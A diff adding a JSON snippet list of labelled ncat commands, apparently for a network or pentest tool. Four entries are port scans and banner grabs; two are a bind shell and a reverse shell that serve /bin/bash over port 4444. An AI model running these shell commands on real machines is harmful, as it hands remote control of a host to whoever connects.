@@ -1,0 +1,8 @@
+{
+  "Ncat - Quiet Zero-I/O Probe": "ncat -zv -w 2 192.168.1.1 1-1000",
+  "Ncat - Timed Banner Probe": "ncat -w 3 192.168.1.1 80",
+  "Ncat - Listener Shell Bind": "ncat -lvp 4444 -e /bin/bash",
+  "Ncat - Reverse Shell Connect": "ncat -e /bin/bash 192.168.1.100 4444",
+  "Ncat - Banner Grab": "ncat -v 192.168.1.1 80",
+  "Ncat - SSL Banner Grab": "ncat --ssl -v 192.168.1.1 443"
+}
